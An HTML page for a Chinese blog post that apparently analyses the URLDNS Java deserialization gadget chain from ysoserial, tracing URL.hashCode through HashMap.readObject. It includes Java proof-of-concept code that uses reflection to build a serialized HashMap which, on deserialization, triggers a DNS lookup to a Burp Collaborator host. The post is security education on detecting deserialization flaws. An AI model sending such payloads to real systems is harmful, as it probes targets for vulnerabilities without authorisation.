@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="作者：Narcher	时间：2024&#x2F;3&#x2F;16	分类：Vulnerability Analysis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA安全:URLDNS链">
+<meta property="og:url" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/index.html">
+<meta property="og:site_name" content="Narcherの小窝">
+<meta property="og:description" content="作者：Narcher	时间：2024&#x2F;3&#x2F;16	分类：Vulnerability Analysis">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710588514830.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710588856154.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710588938529.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589249117.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589324316.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710590232141.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589616180.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589823250.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710590638330.png">
+<meta property="article:published_time" content="2024-12-22T08:39:29.000Z">
+<meta property="article:modified_time" content="2024-03-16T12:06:31.739Z">
+<meta property="article:author" content="Narcher Alter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710588514830.png">
+
+<link rel="canonical" href="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>JAVA安全:URLDNS链 | Narcherの小窝</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Narcherの小窝</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Narcher Alter">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Narcherの小窝">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JAVA安全:URLDNS链
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-12-22 16:39:29" itemprop="dateCreated datePublished" datetime="2024-12-22T16:39:29+08:00">2024-12-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-03-16 20:06:31" itemprop="dateModified" datetime="2024-03-16T20:06:31+08:00">2024-03-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><em>作者：Narcher</em>	<em>时间：2024&#x2F;3&#x2F;16</em>	<em>分类：Vulnerability Analysis</em></p>
+<span id="more"></span>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>URLDNS链是ysoserial中的一条非常经典的链，由于其与jdk版本无关，使用的均为java内置类，常常被用于检测目标是否存在反序列化漏洞，这条链本身是没有什么危害的，仅能发起DNS请求。</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>我们先去ysoserial中看一下这条链的完整流程：</p>
+<p><img src="/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710588514830.png" alt="1710588514830"></p>
+<p>可以看见这条链的流程非常简单，我们就倒着来分析一遍。</p>
+<h3 id="1-URL-hashCode-部分"><a href="#1-URL-hashCode-部分" class="headerlink" title="1.URL.hashCode()部分"></a>1.URL.hashCode()部分</h3><p>为什么要利用URL.hashCode()呢？我们进去看一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现它的hashCode()方法里边调用了URLStreamHandler的hashCode()方法，而URLStreamHandler的hashCode()方法则如下图所示：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710588856154.png" alt="1710588856154" style="zoom:50%;">
+
+<p>可见其将URL传入后调用了getHostAddress()方法，而getHostAddress()方法则会发送DNS请求去查询URL的主机名，如下图所示：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710588938529.png" alt="1710588938529" style="zoom:50%;">
+
+<p>既然如此，我们从终点往上回溯，去看看HashMap如何调用的hashCode()方法。</p>
+<h3 id="2-HashMap-hash-部分"><a href="#2-HashMap-hash-部分" class="headerlink" title="2.HashMap.hash()部分"></a>2.HashMap.hash()部分</h3><p>它这个HashMap很有意思，里边呢接收两个随意的值，一个当KEY，一个当VALUE。我们要找HashMap里调用hashCode()方法的地方，如下：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589249117.png" alt="1710589249117" style="zoom: 67%;">
+
+<p>之后我们再往上找利用HashMap中hash()方法的地方。</p>
+<h3 id="3-HashMap-putVal-部分"><a href="#3-HashMap-putVal-部分" class="headerlink" title="3.HashMap.putVal()部分"></a>3.HashMap.putVal()部分</h3><p>我们可以看到HashMap自身的put()方法中有putVal()方法对hash()方法进行了调用，而该方法则是在readObject()中也有调用：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589324316.png" alt="1710589324316" style="zoom: 67%;">
+
+<h3 id="4-HashMap-readObject-部分"><a href="#4-HashMap-readObject-部分" class="headerlink" title="4.HashMap.readObject()部分"></a>4.HashMap.readObject()部分</h3><p>因为我们在反序列化的时候会触发readObject()方法，而HashMap则对readObject()方法进行了重写，因此我们可以直接将HashMap进行序列化，然后反序列化触发上述URLDNS链。</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710590232141.png" alt="1710590232141" style="zoom:50%;">
+
+<h3 id="5-构造链"><a href="#5-构造链" class="headerlink" title="5.构造链"></a>5.构造链</h3><img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589616180.png" alt="1710589616180" style="zoom:67%;">
+
+<p>仅按上述描述来看的话，我们就能够利用上图中的链进行触发了。但实际上，通过调试可以发现，此时触发这条链的并非反序列化，而是序列化之前的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashMap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://d1fq6zzx9q24dt8yandyaqt5awgm4b.burpcollaborator.net&quot;</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这个就很有意思了，因为put()方法会直接调用hash()方法，导致这条链正向执行一遍，那么我们在反序列化的时候是否还会触发呢？</p>
+<p>答案是NONONO~~~~</p>
+<p>因为从URL.hashCode()方法中我们可以看到，其私有属性hashCode仅在值为-1的时候会进行执行URLStreamHandler的hashCode()方法，而在正向触发过一次之后，hashCode已经被赋值为其他值了，不能再次触发。那么我们有什么办法使其值在运行过程中改变呢？答案是反射。</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589823250.png" alt="1710589823250" style="zoom:67%;">
+
+<h4 id="反射的引用"><a href="#反射的引用" class="headerlink" title="反射的引用"></a>反射的引用</h4><p>我们想要这条链在序列化的时候不被触发，而在反序列化的时候触发。那么我们就利用反射，将其在序列化之前，也就是put的时候hashCode赋值为其他，而在序列化前赋值为-1，使其反序列化正好触发。</p>
+<p>链子如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://7ltkbk2jj0pgndcc33oyxbsy1p7fv4.burpcollaborator.net&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashcode.setAccessible(<span class="literal">true</span>);<span class="comment">//针对私有方法必备</span></span><br><span class="line">hashcode.set(url,<span class="number">1</span>);</span><br><span class="line">hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">hashcode.set(url,-<span class="number">1</span>);</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\URLDNS.txt&quot;</span>));</span><br><span class="line">oos.writeObject(hashMap);</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\URLDNS.txt&quot;</span>));</span><br><span class="line">ois.readObject();</span><br></pre></td></tr></table></figure>
+
+<p>之后我们便可看到正常的DNS请求了：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710590638330.png" alt="1710590638330" style="zoom:50%;">
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="JAVA安全:Shiro-550反序列化">
+      <i class="fa fa-chevron-left"></i> JAVA安全:Shiro-550反序列化
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-URL-hashCode-%E9%83%A8%E5%88%86"><span class="nav-number">2.1.</span> <span class="nav-text">1.URL.hashCode()部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-HashMap-hash-%E9%83%A8%E5%88%86"><span class="nav-number">2.2.</span> <span class="nav-text">2.HashMap.hash()部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-HashMap-putVal-%E9%83%A8%E5%88%86"><span class="nav-number">2.3.</span> <span class="nav-text">3.HashMap.putVal()部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-HashMap-readObject-%E9%83%A8%E5%88%86"><span class="nav-number">2.4.</span> <span class="nav-text">4.HashMap.readObject()部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%9E%84%E9%80%A0%E9%93%BE"><span class="nav-number">2.5.</span> <span class="nav-text">5.构造链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E7%9A%84%E5%BC%95%E7%94%A8"><span class="nav-number">2.5.1.</span> <span class="nav-text">反射的引用</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Narcher Alter</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Narcher Alter</span>
+</div>
+<!--
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
